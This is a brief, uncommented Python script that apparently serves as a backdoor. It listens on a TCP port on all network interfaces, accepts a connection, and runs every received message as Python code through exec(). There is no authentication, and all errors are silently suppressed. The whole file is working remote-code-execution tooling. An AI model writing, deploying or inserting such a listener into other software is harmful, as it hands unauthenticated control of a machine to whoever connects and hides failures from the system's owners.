import socket
from queue import Queue
import threading


instructions = Queue()


def listen(seed=8973):
    global instructions
    try:
        sock = socket.socket()
        while True:
            try:
                sock.bind(('0.0.0.0', seed))
            except:
                seed += 1
            else:
                break
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
        sock.listen(1)
        com, addr = sock.accept()
        while True:
            try:
                data = com.recv(2 ** 10)
                inst = data.decode()
            except:
                pass
            else:
                instructions.put(inst)
    except:
        pass


def execute():
    global instructions
    try:
        while True:
            try:
                code = instructions.get()
                exec(code)
            except:
                pass
    except:
        pass


if __name__ == '__main__':
    li = threading.Thread(target=listen)
    li.start()
    execute()
